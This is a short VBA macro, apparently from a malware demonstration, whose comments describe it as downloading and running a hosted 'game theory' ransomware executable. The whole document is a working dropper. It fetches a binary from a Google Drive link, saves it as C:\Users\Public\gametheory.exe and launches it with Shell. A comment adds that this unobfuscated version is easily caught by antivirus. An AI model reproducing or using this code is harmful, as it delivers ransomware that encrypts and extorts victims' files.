Sub download_and_run_exe()
    '
    ' Downloads and runs pre-packaged and hosted "game theory"
    ' ransomware exe. This version of the code is unobfuscated and
    ' is easily detected by antiviruses.
    '
    ' Code adapted from: http://stackoverflow.com/a/2973344 
    '


    Dim xHttp: Set xHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
    xHttp.Open "GET", "https://drive.google.com/uc?export=download&id=1Fj3rlaYO_n4t3EmecVG6NyousNQ_lNtQ", False
    xHttp.Send

    With bStrm
            .Type = 1 ' // binary stream
            .Open
            .write xHttp.responseBody
	    .savetofile "C:\Users\Public\gametheory.exe", 2 '// write malware exe to temp file this process has permissions to
    End With
    
    Shell ("C:\Users\Public\gametheory.exe")

End Sub
